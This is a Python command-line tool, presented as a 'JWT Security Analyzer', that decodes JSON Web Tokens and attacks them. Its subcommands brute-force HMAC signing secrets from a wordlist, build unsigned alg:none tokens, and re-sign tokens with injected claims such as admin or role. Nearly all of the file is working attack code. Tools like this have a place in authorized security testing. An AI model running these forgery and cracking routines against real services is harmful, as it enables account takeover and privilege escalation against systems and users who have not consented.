#!/usr/bin/env python3
"""
JWT Security Analyzer
Author: nadirzhon | github.com/nadirzhon
"""

import argparse
import base64
import json
import hmac as hmac_lib
import hashlib
import time
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

def b64d(s):
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def parse_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT")
    header = json.loads(b64d(parts[0]))
    payload = json.loads(b64d(parts[1]))
    return header, payload, parts

def analyze(token):
    header, payload, parts = parse_jwt(token)
    print(f"\n{Fore.CYAN}=== JWT Analysis ==={Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}Header:{Style.RESET_ALL}")
    for k, v in header.items():
        print(f"  {k}: {v}")

    alg = header.get("alg", "")
    if alg == "none":
        print(f"  {Fore.RED}[CRITICAL] alg=none — signature not verified!")
    elif alg.startswith("HS"):
        print(f"  {Fore.YELLOW}[INFO] HMAC — symmetric, brute-forceable")
    elif alg.startswith("RS"):
        print(f"  {Fore.GREEN}[INFO] RSA asymmetric")

    print(f"\n{Fore.YELLOW}Payload:{Style.RESET_ALL}")
    now = time.time()
    for k, v in payload.items():
        if k in ("exp", "nbf", "iat"):
            dt = datetime.fromtimestamp(v)
            expired = k == "exp" and v < now
            mark = f"{Fore.RED}[EXPIRED]" if expired else f"{Fore.GREEN}[valid]"
            print(f"  {k}: {v} ({dt}) {mark}{Style.RESET_ALL}")
        else:
            print(f"  {k}: {v}")

    priv = [k for k in payload if k.lower() in ["admin","role","is_admin","scope"]]
    if priv:
        print(f"\n  {Fore.RED}[!] Privilege claims: {priv} — test for escalation!")

def crack(token, wordlist):
    header, payload, parts = parse_jwt(token)
    alg = header.get("alg", "HS256")
    if not alg.startswith("HS"):
        print(f"{Fore.RED}Not HMAC")
        return
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target = b64d(parts[2])
    fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
    print(f"{Fore.CYAN}[*] Cracking {alg}...{Style.RESET_ALL}")
    try:
        with open(wordlist, encoding="utf-8", errors="ignore") as f:
            for i, line in enumerate(f):
                secret = line.strip().encode()
                sig = hmac_lib.new(secret, signing_input, fn).digest()
                if hmac_lib.compare_digest(sig, target):
                    print(f"{Fore.GREEN}[+] SECRET: {secret.decode()}")
                    return secret.decode()
                if i % 50000 == 0:
                    print(f"  Tried {i}...", end="\r")
    except FileNotFoundError:
        print(f"{Fore.RED}Wordlist not found")
    print(f"{Fore.RED}[-] Not found")

def alg_none(token):
    header, payload, _ = parse_jwt(token)
    fh = json.dumps({"alg": "none", "typ": "JWT"}, separators=(",",":"))
    fp = json.dumps(payload, separators=(",",":"))
    forged = f"{b64e(fh.encode())}.{b64e(fp.encode())}."
    print(f"{Fore.YELLOW}[*] alg:none token:{Style.RESET_ALL}")
    print(f"  {forged}")
    return forged

def forge(token, secret, claims=None):
    import jwt as pyjwt
    header, payload, _ = parse_jwt(token)
    if claims:
        payload.update(json.loads(claims))
    alg = header.get("alg", "HS256")
    forged = pyjwt.encode(payload, secret, algorithm=alg)
    print(f"{Fore.GREEN}[+] Forged: {forged}")
    return forged

def main():
    parser = argparse.ArgumentParser()
    sub = parser.add_subparsers(dest="cmd")

    a = sub.add_parser("analyze"); a.add_argument("--token", required=True)
    c = sub.add_parser("crack"); c.add_argument("--token", required=True); c.add_argument("--wordlist", required=True)
    n = sub.add_parser("algnone"); n.add_argument("--token", required=True)
    f = sub.add_parser("forge"); f.add_argument("--token", required=True); f.add_argument("--secret", required=True); f.add_argument("--claims")

    args = parser.parse_args()
    if args.cmd == "analyze":   analyze(args.token)
    elif args.cmd == "crack":   crack(args.token, args.wordlist)
    elif args.cmd == "algnone": alg_none(args.token)
    elif args.cmd == "forge":   forge(args.token, args.secret, args.claims)
    else: parser.print_help()

if __name__ == "__main__":
    main()
